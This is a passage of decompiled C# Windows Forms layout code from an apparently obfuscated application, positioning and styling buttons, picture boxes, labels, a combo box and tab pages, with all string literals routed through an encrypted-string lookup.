		((Control)button13).Location = new Point(256, 428);
		((Control)button13).Margin = new Padding(5, 3, 5, 3);
		((Control)button13).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x69F8D9BC ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_aa05297beeb84923a95217091581509e);
		((Control)button13).Size = new Size(115, 38);
		((Control)button13).TabIndex = 19;
		((Control)button13).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20C28C34 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8141a8b72aa44b3a664e8c4a2731290);
		((ButtonBase)button13).UseVisualStyleBackColor = false;
		((Control)button13).Click += button13_Click;
		((Control)button12).BackColor = Color.MediumOrchid;
		((Control)button12).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3BD0CE5F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e52265234ff4c2a9724c7236ffbb26e), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button12).ForeColor = SystemColors.ControlLightLight;
		((Control)button12).Location = new Point(505, 428);
		((Control)button12).Margin = new Padding(5, 3, 5, 3);
		((Control)button12).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5ADE7010 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d06723451b644b929e3ffec494e31c68);
		((Control)button12).Size = new Size(115, 38);
		((Control)button12).TabIndex = 18;
		((Control)button12).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5ADE7004 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d06723451b644b929e3ffec494e31c68);
		((ButtonBase)button12).UseVisualStyleBackColor = false;
		((Control)button12).Click += button12_Click;
		((Control)button11).BackColor = Color.FromArgb(0, 0, 64);
		((Control)button11).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x608EB93C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button11).ForeColor = SystemColors.ControlLightLight;
		((Control)button11).Location = new Point(955, 1);
		((Control)button11).Margin = new Padding(5, 3, 5, 3);
		((Control)button11).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3BD0D231 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e52265234ff4c2a9724c7236ffbb26e);
		((Control)button11).Size = new Size(150, 38);
		((Control)button11).TabIndex = 17;
		((Control)button11).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5BBB5C0F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_57a6661532394af0a3862bba53f2036e);
		((ButtonBase)button11).UseVisualStyleBackColor = false;
		((Control)button11).Click += button11_Click_1;
		pictureBox1.BorderStyle = (BorderStyle)2;
		((Control)pictureBox1).Location = new Point(14, 120);
		((Control)pictureBox1).Margin = new Padding(5, 3, 5, 3);
		((Control)pictureBox1).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46BC9789 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_7539847744bb4f3f89a249de2658ea6a);
		((Control)pictureBox1).Size = new Size(177, 239);
		pictureBox1.SizeMode = (PictureBoxSizeMode)1;
		pictureBox1.TabIndex = 1;
		pictureBox1.TabStop = false;
		((Control)pictureBox1).Click += pictureBox1_Click;
		((Control)button1).BackColor = Color.FromArgb(64, 64, 64);
		((Control)button1).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x60583C09 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dbb1db1002814c06a313ab667583ca7c), 8f, (FontStyle)1);
		((Control)button1).ForeColor = SystemColors.ControlLightLight;
		((Control)button1).Location = new Point(136, 76);
		((Control)button1).Margin = new Padding(5, 3, 5, 3);
		((Control)button1).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5BBB5C35 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_57a6661532394af0a3862bba53f2036e);
		((Control)button1).Size = new Size(60, 38);
		((Control)button1).TabIndex = 0;
		((Control)button1).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x41E0EE85 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_88e9930f59e44575938220c3d0d1476a);
		((ButtonBase)button1).UseVisualStyleBackColor = false;
		((Control)button1).Click += button1_Click;
		pictureBox2.BorderStyle = (BorderStyle)2;
		((Control)pictureBox2).Enabled = false;
		((Control)pictureBox2).Location = new Point(251, 75);
		((Control)pictureBox2).Margin = new Padding(0);
		((Control)pictureBox2).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x605823F7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dbb1db1002814c06a313ab667583ca7c);
		((Control)pictureBox2).Size = new Size(294, 148);
		pictureBox2.SizeMode = (PictureBoxSizeMode)4;
		pictureBox2.TabIndex = 3;
		pictureBox2.TabStop = false;
		((Control)pictureBox2).Click += pictureBox2_Click;
		((Control)button3).BackColor = Color.Blue;
		((Control)button3).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DAA0017 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8ecef0c4e6e47e98be39ecaecaed208), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button3).ForeColor = SystemColors.ControlLightLight;
		((Control)button3).Location = new Point(281, 1);
		((Control)button3).Margin = new Padding(5, 3, 5, 3);
		((Control)button3).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x736E1341 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_3236a4e0edc64b94986eb76d39096e40);
		((Control)button3).Size = new Size(107, 38);
		((Control)button3).TabIndex = 4;
		((Control)button3).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2319EF2C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8af4c72c2bf24df2961c47634b9fc94e);
		((ButtonBase)button3).UseVisualStyleBackColor = false;
		((Control)button3).Click += button3_Click;
		((Control)progressBar1).Location = new Point(256, 391);
		((Control)progressBar1).Margin = new Padding(5, 3, 5, 3);
		((Control)progressBar1).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4B3DF5C3 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70799b9eb9474c3b9c4b685f65883782);
		((Control)progressBar1).Size = new Size(692, 18);
		((Control)progressBar1).TabIndex = 6;
		((Control)label1).AutoSize = true;
		((Control)label1).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54044185 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d2a5bdc84a4644acb5d9fa871e9d89cc), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)label1).ForeColor = SystemColors.ControlLightLight;
		((Control)label1).Location = new Point(10, 17);
		((Control)label1).Margin = new Padding(5, 0, 5, 0);
		((Control)label1).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1F03CD2B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_ba511a03f3884e04a1032f95e5af7ce7);
		((Control)label1).Size = new Size(190, 19);
		((Control)label1).TabIndex = 10;
		((Control)label1).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5C9AE69F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0d8c03b1d7c340b4853785e650ce2549);
		((Control)button5).BackColor = Color.Green;
		((Control)button5).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x387F6A3D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_903c9fa40f3d4d0fb3bcd63cbccd82bc), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button5).ForeColor = SystemColors.ControlLightLight;
		((Control)button5).Location = new Point(605, 1);
		((Control)button5).Margin = new Padding(5, 3, 5, 3);
		((Control)button5).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54E91BD3 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_be6aa5f9bc844d2098a21bb598f8ce61);
		((Control)button5).Size = new Size(110, 38);
		((Control)button5).TabIndex = 8;
		((Control)button5).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1CB3D170 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8d38eba5cedc4c1fa516f3280fa0cc49);
		((ButtonBase)button5).UseVisualStyleBackColor = false;
		((Control)button5).Click += button5_Click;
		comboBox1.DropDownStyle = (ComboBoxStyle)2;
		((Control)comboBox1).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x50BCBB04 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_baadfbd8c0914381a19d37bd12cce8f6), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((ListControl)comboBox1).FormattingEnabled = true;
		comboBox1.Items.AddRange(new object[2]
		{
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x128C9A4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_807d1b955a4f4b29a5cb4b57c2d18bc3),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD9F2187 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0833f608dcca449f93bb40a86263840a)
		});
		((Control)comboBox1).Location = new Point(251, 39);
		((Control)comboBox1).Margin = new Padding(5, 3, 5, 3);
		((Control)comboBox1).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(--1831747487 ^ 0x7AF11FC1 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_65959cbbae0e4d08b8072ed54d2c0e5a);
		((Control)comboBox1).Size = new Size(294, 27);
		((Control)comboBox1).TabIndex = 9;
		comboBox1.SelectedIndexChanged += comboBox1_SelectedIndexChanged;
		tabControl1.Appearance = (TabAppearance)2;
		((Control)tabControl1).Controls.Add((Control)(object)tabPage3);
		((Control)tabControl1).Controls.Add((Control)(object)tabPage1);
		((Control)tabControl1).Controls.Add((Control)(object)tabPage4);
		((Control)tabControl1).Controls.Add((Control)(object)tabPage5);
		((Control)tabControl1).Controls.Add((Control)(object)tabPage2tsad);
		((Control)tabControl1).Controls.Add((Control)(object)tabPage2);
		((Control)tabControl1).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22F1A40E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_69dd1a730f2a42979206d319258f7586), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		tabControl1.ItemSize = new Size(70, 50);
		((Control)tabControl1).Location = new Point(0, 0);
		((Control)tabControl1).Margin = new Padding(0);
		((Control)tabControl1).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x42FE8730 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_ce14555c8e314f729d5e754b0132dafe);
		tabControl1.SelectedIndex = 0;
		((Control)tabControl1).Size = new Size(1259, 763);
		((Control)tabControl1).TabIndex = 17;
		((Control)tabPage3).BackColor = Color.FromArgb(16, 26, 40);
		((Control)tabPage3).Controls.Add((Control)(object)pictureBox21);
		((Control)tabPage3).Controls.Add((Control)(object)pictureBox20);
		((Control)tabPage3).Controls.Add((Control)(object)label2);
		((Control)tabPage3).Controls.Add((Control)(object)button32);
		((Control)tabPage3).Controls.Add((Control)(object)button83);
		((Control)tabPage3).Controls.Add((Control)(object)button84);
		((Control)tabPage3).Controls.Add((Control)(object)button87);
		((Control)tabPage3).Controls.Add((Control)(object)button91);
		((Control)tabPage3).Controls.Add((Control)(object)button92);
		((Control)tabPage3).Controls.Add((Control)(object)button93);
		((Control)tabPage3).Controls.Add((Control)(object)button94);
		((Control)tabPage3).Controls.Add((Control)(object)button96);
		((Control)tabPage3).Controls.Add((Control)(object)comboBox10);
		((Control)tabPage3).Controls.Add((Control)(object)textBox20);
		((Control)tabPage3).Controls.Add((Control)(object)textBox54);
		((Control)tabPage3).Controls.Add((Control)(object)label38);
		((Control)tabPage3).Controls.Add((Control)(object)label94);
		((Control)tabPage3).Controls.Add((Control)(object)label95);
		((Control)tabPage3).Controls.Add((Control)(object)label96);
		((Control)tabPage3).Controls.Add((Control)(object)textBox55);
		((Control)tabPage3).Controls.Add((Control)(object)textBox56);
		((Control)tabPage3).Controls.Add((Control)(object)textBox57);
		((Control)tabPage3).Controls.Add((Control)(object)label97);
		((Control)tabPage3).Controls.Add((Control)(object)comboBox35);
		((Control)tabPage3).Controls.Add((Control)(object)label104);
		((Control)tabPage3).Controls.Add((Control)(object)label110);
		((Control)tabPage3).Controls.Add((Control)(object)textBox64);
		((Control)tabPage3).Controls.Add((Control)(object)textBox65);
		((Control)tabPage3).Controls.Add((Control)(object)textBox66);
		((Control)tabPage3).Controls.Add((Control)(object)label111);
		((Control)tabPage3).Controls.Add((Control)(object)label112);
		((Control)tabPage3).Controls.Add((Control)(object)label113);
		((Control)tabPage3).Controls.Add((Control)(object)pictureBox31);
		((Control)tabPage3).Controls.Add((Control)(object)button98);
		((Control)tabPage3).Controls.Add((Control)(object)button99);
		((Control)tabPage3).Controls.Add((Control)(object)label114);
		((Control)tabPage3).Controls.Add((Control)(object)pictureBox35);
		((Control)tabPage3).Controls.Add((Control)(object)button100);
		((Control)tabPage3).Controls.Add((Control)(object)button101);
		((Control)tabPage3).Controls.Add((Control)(object)button102);
		((Control)tabPage3).Controls.Add((Control)(object)button103);
		((Control)tabPage3).Controls.Add((Control)(object)pictureBox36);
		((Control)tabPage3).Controls.Add((Control)(object)button104);
		((Control)tabPage3).Controls.Add((Control)(object)button105);
		((Control)tabPage3).Controls.Add((Control)(object)progressBar5);
		((Control)tabPage3).Controls.Add((Control)(object)label115);
		((Control)tabPage3).Controls.Add((Control)(object)button106);
		((Control)tabPage3).Controls.Add((Control)(object)comboBox36);
		tabPage3.Location = new Point(4, 54);
		((Control)tabPage3).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x24C5EA2 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f21b1171952f4cd2aae5d7be2be94970);
		((Control)tabPage3).Padding = new Padding(3);
		((Control)tabPage3).Size = new Size(1251, 705);
		tabPage3.TabIndex = 3;
		((Control)tabPage3).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5C9AF81B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0d8c03b1d7c340b4853785e650ce2549);
		pictureBox21.BorderStyle = (BorderStyle)2;
		((Control)pictureBox21).Enabled = false;
		((Control)pictureBox21).Location = new Point(616, 66);
		((Control)pictureBox21).Margin = new Padding(0);
		((Control)pictureBox21).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x128C83E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_807d1b955a4f4b29a5cb4b57c2d18bc3);
		((Control)pictureBox21).Size = new Size(275, 422);
		pictureBox21.SizeMode = (PictureBoxSizeMode)4;
		pictureBox21.TabIndex = 195;
		pictureBox21.TabStop = false;
		((Control)pictureBox21).Click += pictureBox21_Click;
		pictureBox20.BorderStyle = (BorderStyle)2;
		((Control)pictureBox20).Enabled = false;
		((Control)pictureBox20).Location = new Point(294, 66);
		((Control)pictureBox20).Margin = new Padding(0);
		((Control)pictureBox20).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x6F72693E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2b8c33c9b9eb4979870d40c63f7b4165);
		((Control)pictureBox20).Size = new Size(275, 422);
		pictureBox20.SizeMode = (PictureBoxSizeMode)4;
		pictureBox20.TabIndex = 194;
		pictureBox20.TabStop = false;
		((Control)pictureBox20).Click += pictureBox20_Click;
		((Control)label2).AutoSize = true;
		((Control)label2).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BF9FEC ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e6f96868e8e46d3959156c0871dafbc), 10f, (FontStyle)1);
		((Control)label2).ForeColor = SystemColors.ControlLightLight;
		((Control)label2).Location = new Point(11, 556);
		((Control)label2).Margin = new Padding(5, 0, 5, 0);
		((Control)label2).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1160BA02 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_07094e8430e84644a3b46793c68193e0);
		((Control)label2).Size = new Size(62, 16);
		((Control)label2).TabIndex = 193;
		((Control)label2).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(--863542085 ^ 0xB07EF20 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_903c9fa40f3d4d0fb3bcd63cbccd82bc);
		((Control)button32).BackColor = Color.Teal;
		((Control)button32).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x128D6DE ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_807d1b955a4f4b29a5cb4b57c2d18bc3), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button32).ForeColor = SystemColors.ControlLightLight;
		((Control)button32).Location = new Point(1126, 12);
		((Control)button32).Margin = new Padding(5, 3, 5, 3);
		((Control)button32).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x222B35A0 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_4a30e34068e34f6f9ca741119ec24a63);
		((Control)button32).Size = new Size(83, 38);
		((Control)button32).TabIndex = 192;
		((Control)button32).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2B718B56 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d4486f79952142cc9aa30d377c51de33);
		((ButtonBase)button32).UseVisualStyleBackColor = false;
		((Control)button32).Click += button32_Click_1;
		((Control)button83).BackColor = Color.Teal;
		((Control)button83).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22F1A40E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_69dd1a730f2a42979206d319258f7586), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button83).ForeColor = SystemColors.ControlLightLight;
		((Control)button83).Location = new Point(760, 12);
		((Control)button83).Margin = new Padding(5, 3, 5, 3);
		((Control)button83).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46A2AFBD ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0cbf980cef9f4f6d841f2b5e631058fc);
		((Control)button83).Size = new Size(107, 38);
		((Control)button83).TabIndex = 191;
		((Control)button83).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x63EEF530 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70403a9e26494e1a929252072003a0e6);
		((ButtonBase)button83).UseVisualStyleBackColor = false;
		((Control)button83).Click += button83_Click;
		((Control)button84).BackColor = Color.Teal;
		((Control)button84).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(-2023214386 ^ -590122277 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_57a6661532394af0a3862bba53f2036e), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button84).ForeColor = SystemColors.ControlLightLight;
		((Control)button84).Location = new Point(435, 12);
		((Control)button84).Margin = new Padding(5, 3, 5, 3);
		((Control)button84).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(--1146229973 ^ 0x457ADC15 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_807d1b955a4f4b29a5cb4b57c2d18bc3);
		((Control)button84).Size = new Size(107, 38);
		((Control)button84).TabIndex = 190;
		((Control)button84).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4DA30BCB ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8350575ae23c47268ab6d6a27e6944ee);
		((ButtonBase)button84).UseVisualStyleBackColor = false;
		((Control)button84).Click += button84_Click;
		((Control)button87).BackColor = Color.Blue;
		((Control)button87).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x589A43EA ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a578ede9d9414aabbdcf1d01b7348baf), 10f, (FontStyle)1);
		((Control)button87).ForeColor = SystemColors.ControlLightLight;
		((Control)button87).Location = new Point(31, 83);
		((Control)button87).Margin = new Padding(5, 3, 5, 3);
		((Control)button87).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7FC91458 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f6b54f43bc5c4099a4aa9b9155cdd47a);
		((Control)button87).Size = new Size(124, 38);
		((Control)button87).TabIndex = 185;
		((Control)button87).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(-2083794465 ^ -149886038 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_904c7ffdb8fc47b685c80da894c6344f);
		((ButtonBase)button87).UseVisualStyleBackColor = false;
		((Control)button87).Click += button87_Click;
		((Control)button91).BackColor = Color.Green;
		((Control)button91).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x63EEF6A6 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70403a9e26494e1a929252072003a0e6), 8f, (FontStyle)1);
		((Control)button91).ForeColor = SystemColors.ControlLightLight;
		((Control)button91).Location = new Point(817, 622);
		((Control)button91).Margin = new Padding(5, 3, 5, 3);
		((Control)button91).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x30029571 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fe963489b71c4328899bd0cc4b7f7da9);
		((Control)button91).Size = new Size(71, 23);
		((Control)button91).TabIndex = 179;
		((Control)button91).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1BA11D86 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_13ebf17f56b549d9971d1dc2218be2ad);
		((ButtonBase)button91).UseVisualStyleBackColor = false;
		((Control)button91).Click += button91_Click;
		((Control)button92).BackColor = Color.Green;
		((Control)button92).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4B3DEA4B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70799b9eb9474c3b9c4b685f65883782), 8f, (FontStyle)1);
		((Control)button92).ForeColor = SystemColors.ControlLightLight;
		((Control)button92).Location = new Point(1166, 549);
		((Control)button92).Margin = new Padding(5, 3, 5, 3);
		((Control)button92).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(--863542085 ^ 0x69A6E921 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d06723451b644b929e3ffec494e31c68);
		((Control)button92).Size = new Size(71, 23);
		((Control)button92).TabIndex = 178;
		((Control)button92).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1160A6AA ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_07094e8430e84644a3b46793c68193e0);
		((ButtonBase)button92).UseVisualStyleBackColor = false;
		((Control)button92).Click += button92_Click;
		((Control)button93).BackColor = Color.Green;
		((Control)button93).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x596CF912 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_e38ac3b620fc42ae863103cddbe6a1eb), 8f, (FontStyle)1);
		((Control)button93).ForeColor = SystemColors.ControlLightLight;
		((Control)button93).Location = new Point(993, 549);
		((Control)button93).Margin = new Padding(5, 3, 5, 3);
		((Control)button93).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x69F8D4CC ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_aa05297beeb84923a95217091581509e);
		((Control)button93).Size = new Size(71, 23);
		((Control)button93).TabIndex = 177;
		((Control)button93).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BF9DEC ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e6f96868e8e46d3959156c0871dafbc);
		((ButtonBase)button93).UseVisualStyleBackColor = false;
		((Control)button93).Click += button93_Click;
		((Control)button94).BackColor = Color.Green;
		((Control)button94).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x74DB3955 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_904c7ffdb8fc47b685c80da894c6344f), 8f, (FontStyle)1);
		((Control)button94).ForeColor = SystemColors.ControlLightLight;
		((Control)button94).Location = new Point(795, 549);
		((Control)button94).Margin = new Padding(5, 3, 5, 3);
